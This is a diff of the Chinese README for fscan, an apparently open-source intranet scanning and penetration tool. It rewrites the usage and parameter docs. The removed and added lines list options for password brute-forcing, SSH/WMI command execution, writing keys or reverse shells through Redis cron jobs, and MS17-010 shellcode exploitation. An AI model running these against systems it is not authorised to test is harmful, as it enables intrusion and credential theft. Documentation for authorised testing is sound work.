@@ -48,140 +48,185 @@
 - 扫描结果存储：将所有检测结果保存至文件，便于后续分析
 
 # 0x03 使用说明
-## 基础用法
+
+## 基础扫描
+
 ```bash
-# 默认扫描(使用全部模块)
-fscan.exe -h 192.168.1.1/24
-
-# B段扫描
-fscan.exe -h 192.168.1.1/16
-```
-
-## 进阶用法
-
-### 扫描控制
-```bash
-# 跳过存活检测、不保存文件、跳过web poc扫描
-fscan.exe -h 192.168.1.1/24 -np -no -nopoc
-
-# 指定扫描结果保存路径
-fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt
+# 单一目标或网段扫描
+fscan -h 192.168.1.1/24    # 扫描整个C段
+fscan -h 192.168.1.1/16    # 扫描B段
+fscan -h 192.168.1.1-255   # 范围扫描
+fscan -h 192.168.1.1,192.168.1.2   # 多目标扫描
 
 # 从文件导入目标
-fscan.exe -hf ip.txt
+fscan -hf ip.txt
 ```
 
-### 特定功能
+## 端口配置
 ```bash
-# Redis利用
-fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub    # 写公钥
-fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666    # 计划任务反弹shell
-
-# SSH操作
-fscan.exe -h 192.168.1.1/24 -c whoami    # SSH爆破成功后执行命令
-
-# 密码爆破
-fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt    # 指定用户名密码文件
-fscan.exe -h 192.168.1.1/24 -m smb -pwd password    # SMB密码碰撞
+fscan -h 192.168.1.1/24 -p 22,80,3306    # 指定端口扫描
+fscan -h 192.168.1.1/24 -p 1-65535        # 端口范围
+fscan -h 192.168.1.1/24 -pa 3389          # 添加额外端口
+fscan -h 192.168.1.1/24 -pn 445           # 排除特定端口
 ```
 
-### 代理设置
+## 认证配置
 ```bash
-# HTTP代理
-fscan.exe -u http://baidu.com -proxy 8080
+# 用户名密码配置
+fscan -h 192.168.1.1/24 -user admin -pwd password    # 指定用户名密码
+fscan -h 192.168.1.1/24 -userf users.txt -pwdf pwd.txt    # 指定字典文件
+fscan -h 192.168.1.1/24 -usera newuser -pwda newpass      # 添加额外用户名密码
 
-# SOCKS5代理
-fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080
+# SSH相关
+fscan -h 192.168.1.1/24 -sshkey id_rsa    # 指定SSH密钥
+fscan -h 192.168.1.1/24 -c "whoami"       # SSH连接后执行命令
 ```
 
-### 特定漏洞检测
+## 扫描控制
 ```bash
-# MS17-010检测
-fscan.exe -h 192.168.1.1/24 -m ms17010
+# 扫描方式
+fscan -h 192.168.1.1/24 -np        # 跳过存活检测
+fscan -h 192.168.1.1/24 -ping      # 使用ping替代ICMP
+fscan -h 192.168.1.1/24 -t 1000    # 设置线程数
+fscan -h 192.168.1.1/24 -time 5    # 设置超时时间
 
-# MS17-010利用
-fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add
+# 特定服务扫描
+fscan -h 192.168.1.1/24 -m ssh     # 指定扫描类型
+```
+
+## Web扫描
+```bash
+# Web目标扫描
+fscan -u http://example.com        # 单一URL扫描
+fscan -uf urls.txt                 # 批量URL扫描
+fscan -h 192.168.1.1/24 -nopoc     # 禁用Web POC扫描
+
+# Web扫描配置
+fscan -cookie "session=xxx"         # 设置Cookie
+fscan -wt 10                        # Web请求超时时间
+```
+
+## 代理设置
+```bash
+fscan -proxy http://127.0.0.1:8080      # HTTP代理
+fscan -socks5 127.0.0.1:1080            # SOCKS5代理
+```
+
+## 输出控制
+```bash
+fscan -h 192.168.1.1/24 -o result.txt    # 指定输出文件
+fscan -h 192.168.1.1/24 -no              # 不保存结果
+fscan -h 192.168.1.1/24 -json            # JSON格式输出
+fscan -h 192.168.1.1/24 -silent          # 静默模式
+fscan -h 192.168.1.1/24 -nocolor         # 禁用彩色输出
 ```
 
 ## 编译说明
 ```bash
 # 基础编译
-go build -ldflags="-s -w " -trimpath main.go
+go build -ldflags="-s -w" -trimpath main.go
 
-# 使用UPX压缩（可选）
-upx -9 fscan.exe
+# UPX压缩（可选）
+upx -9 fscan
 ```
 
-## Arch Linux安装
+## 系统安装
 ```bash
-# 使用yay
+# Arch Linux
 yay -S fscan-git
-
-# 或使用paru
+# 或
 paru -S fscan-git
 ```
 
 # 0x04 参数说明
 
 ## 目标设置
-- `-h` : 设置目标IP
-  - 支持单个IP：`192.168.11.11`
-  - 支持IP范围：`192.168.11.11-255`
-  - 支持多个IP：`192.168.11.11,192.168.11.12`
-- `-hf` : 从文件读取目标
-- `-hn` : 设置要排除的IP范围
-- `-u` : 指定单个URL扫描
-- `-uf` : 指定URL文件扫描
+* `-h` : 目标主机配置
+  * 单个IP: `192.168.11.11`
+  * IP范围: `192.168.11.11-255`
+  * IP段: `192.168.11.11/24`
+  * 多目标: `192.168.11.11,192.168.11.12`
+* `-hf` : 从文件读取目标列表
+* `-eh` : 排除特定IP范围，例如: `-eh 192.168.1.1/24`
+* `-u` : 指定单个URL进行Web扫描
+* `-uf` : 从文件读取URL列表
 
-## 扫描控制
-- `-m` : 指定扫描模式，默认为"all"
-- `-t` : 设置扫描线程数，默认600
-- `-time` : 端口扫描超时时间，默认3秒
-- `-wt` : Web访问超时时间，默认5秒
-- `-debug` : 设置进度打印间隔，默认60秒
-- `-silent` : 开启静默模式，适用于CS扫描
+## 扫描模式
+* `-m` : 指定扫描模式，支持以下选项：
+  * `All`: 全量扫描（默认）
+  * `Basic`: 基础服务扫描（Web、FTP、SSH、SMB等）
+  * `Database`: 数据库服务扫描
+  * `Web`: 仅Web服务扫描
+  * `Service`: 常用服务扫描
+  * `Vul`: 漏洞扫描
+  * `Port`: 端口扫描
+  * `ICMP`: ICMP探测
+  * `Local`: 本地信息收集
 
 ## 端口配置
-- `-p` : 指定扫描端口
-  - 默认端口：21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017
-- `-pa` : 在默认端口基础上新增端口
-- `-pn` : 设置要排除的端口
+* `-p` : 指定扫描端口
+  * 支持范围: `1-65535`
+  * 支持列表: `80,443,3306`
+  * 预设组:
+    * `main`: 常用主要端口
+    * `service`: 服务端口
+    * `db`: 数据库端口
+    * `web`: Web服务端口
+    * `all`: 全端口
+* `-pa` : 在默认端口基础上添加端口
+* `-pn` : 排除指定端口
+* `-portf` : 从文件读取端口列表
 
-## 爆破相关
-- `-user` : 指定用户名
-- `-userf` : 指定用户名文件
-- `-pwd` : 指定密码
-- `-pwdf` : 指定密码文件
-- `-usera` : 在默认用户字典基础上新增用户
-- `-pwda` : 在默认密码字典基础上新增密码
+## 认证配置
+* `-user` : 指定单个用户名
+* `-pwd` : 指定单个密码
+* `-userf` : 指定用户名字典文件
+* `-pwdf` : 指定密码字典文件
+* `-usera` : 在默认用户列表基础上添加用户
+* `-pwda` : 在默认密码列表基础上添加密码
+* `-domain` : 指定域名（用于SMB认证）
+* `-sshkey` : 指定SSH私钥文件路径
+* `-hashf` : 指定Hash字典文件
 
-## Web相关
-- `-cookie` : 设置Cookie
-- `-num` : Web POC发包速率，默认20
-- `-pocname` : 指定Web POC的模糊名称
-- `-pocpath` : 指定POC路径
+## 扫描控制
+* `-t` : 扫描线程数（默认600）
+* `-time` : TCP连接超时时间（默认3秒）
+* `-wt` : Web请求超时时间（默认5秒）
+* `-br` : 密码爆破线程数（默认1）
+* `-np` : 禁用存活探测
+* `-ping` : 使用ping代替ICMP进行存活探测
+* `-top` : 显示指定数量的存活主机（默认10）
+* `-local` : 启用本地扫描模式
+
+## Web扫描设置
+* `-cookie` : 设置请求Cookie
+* `-num` : Web POC并发数（默认20）
+* `-pocname` : 指定POC名称进行模糊匹配
+* `-pocpath` : 自定义POC文件路径
+* `-nopoc` : 禁用Web POC扫描
+* `-full` : 启用完整POC扫描
+* `-dns` : 启用dnslog验证
 
 ## 代理设置
-- `-proxy` : 设置HTTP代理
-- `-socks5` : 设置SOCKS5代理
-
-## 输出控制
-- `-o` : 设置结果保存路径，默认"result.txt"
-- `-no` : 不保存扫描结果
-- `-nobr` : 跳过密码爆破
-- `-nopoc` : 跳过Web POC扫描
-- `-np` : 跳过存活探测
+* `-proxy` : HTTP代理，例如: `http://127.0.0.1:8080`
+* `-socks5` : SOCKS5代理，例如: `127.0.0.1:1080`
 
 ## 特殊功能
-- `-c` : SSH命令执行
-- `-domain` : SMB爆破时设置域名
-- `-rf` : Redis写公钥模块的文件路径
-- `-rs` : Redis计划任务反弹shell的IP端口
-- `-sshkey` : 指定SSH私钥路径
-- `-sc` : MS17010利用模块shellcode功能
+* `-c` : 执行命令（支持SSH/WMI）
+* `-rf` : Redis写入SSH公钥的文件路径
+* `-rs` : Redis反弹Shell的目标地址
+* `-sc` : MS17010漏洞利用的Shellcode选项
+* `-wmi` : 启用WMI功能
+* `-path` : 指定远程文件路径（用于FCG/SMB）
 
-## 存活探测
-- `-ping` : 使用ping代替ICMP进行存活探测
+## 输出控制
+* `-o` : 结果输出文件路径（默认"result.txt"）
+* `-no` : 禁用结果保存
+* `-nobr` : 禁用密码爆破
+* `-silent` : 静默模式（无进度输出）
+* `-nocolor` : 禁用彩色输出
+* `-json` : 使用JSON格式输出
+* `-debug` : 设置调试信息输出间隔（默认60秒）
 
 # 0x05 运行截图
 
